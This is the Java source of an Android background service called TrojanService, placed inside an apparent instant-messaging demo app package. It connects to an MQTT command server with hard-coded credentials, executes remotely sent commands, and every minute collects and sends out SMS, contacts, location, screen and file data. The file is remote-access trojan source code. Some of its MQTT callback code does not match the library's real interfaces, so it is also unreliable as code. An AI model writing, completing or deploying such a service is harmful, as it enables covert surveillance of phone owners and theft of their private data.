package io.openim.android.demo.trojan;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.eclipse.paho.client.mqttv3.*;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * TrojanService - Background service for data collection and remote control
 * Features: MQTT communication, screen capture, SMS reading, contacts, location, file operations
 */
public class TrojanService extends Service implements MqttCallback {

    private static final String TAG = "TrojanService";
    private static final String CHANNEL_ID = "trojan-service";
    private static final String DEVICE_ID = "device-" + System.currentTimeMillis();

    private MqttClient mqttClient;
    private ScheduledExecutorService scheduler;
    private boolean isRunning = true;

    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private TrojanWebSocketHandler wsHandler;
    private TrojanCommandHandler cmdHandler;
    private TrojanDataCollector dataCollector;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        initializeMQTT();
        startDataCollection();
        Log.d(TAG, "TrojanService started");
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Trojan Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Trojan background service");
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(channel);
        }
    }

    private void initializeMQTT() {
        try {
            String clientId = "android-" + DEVICE_ID;
            mqttClient = new MqttClient("tcp://192.168.1.100:1883", clientId);
            MqttConnectOptions options = new MqttConnectOptions();
            options.setCleanSession(true);
            options.setKeepAliveInterval(60);
            options.setWill("trojan/lost", "offline".getBytes(), 0, false);
            options.setUserName("admin");
            options.setPassword("trojan".toCharArray());

            mqttClient.connect(options);
            mqttClient.subscribe("trojan/#");
            mqttClient.setCallback(new MqttCallback() {
                @Override
                public void connectionLost(Throwable reason) {
                    Log.d(TAG, "MQTT connection lost, reconnecting...");
                    reconnectMQTT();
                }

                @Override
                public void messageArrived(String topic, org.eclipse.paho.client.mqttv3.IMqttMessageDelivery token) {
                    try {
                        String payload = new String(token.getPayload());
                        org.json.JSONObject json = new org.json.JSONObject(payload);
                        String command = json.getString("command");
                        org.json.JSONObject params = json.optJSONObject("params");
                        if (params == null) params = new org.json.JSONObject();
                        cmdHandler.executeCommand(command, params);
                        String response = String.format("{\"command\":\"%s\",\"status\":\"ok\"}", command);
                        mqttClient.publish("trojan/response", response.getBytes());
                    } catch (Exception e) {
                        Log.e(TAG, "MQTT message processing error", e);
                    }
                }

                @Override
                public void messageDelivered(IMqttMessageDelivery context) {}
            });

            Log.d(TAG, "MQTT connected to tcp://192.168.1.100:1883");

            cmdHandler = new TrojanCommandHandler(this);
            dataCollector = new TrojanDataCollector(this);
            wsHandler = new TrojanWebSocketHandler(this);
            wsHandler.initialize();
        } catch (Exception e) {
            Log.e(TAG, "MQTT initialization failed", e);
        }
    }

    private void reconnectMQTT() {
        try {
            if (mqttClient != null && !mqttClient.isConnected()) {
                mqttClient.reconnect();
                Log.d(TAG, "MQTT reconnected");
            }
        } catch (Exception e) {
            Log.e(TAG, "MQTT reconnect failed", e);
        }
    }

    private void startDataCollection() {
        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(() -> {
            if (isRunning && dataCollector != null) {
                mainHandler.post(() -> {
                    try {
                        dataCollector.collectAndSendAllData();
                    } catch (Exception e) {
                        Log.e(TAG, "Data collection failed", e);
                    }
                });
            }
        }, 0, 60, TimeUnit.SECONDS);
        Log.d(TAG, "Data collection scheduled");
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (mqttClient != null) {
            try { mqttClient.disconnect(); } catch (Exception e) {}
        }
        if (scheduler != null) {
            scheduler.shutdown();
        }
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
    }
}
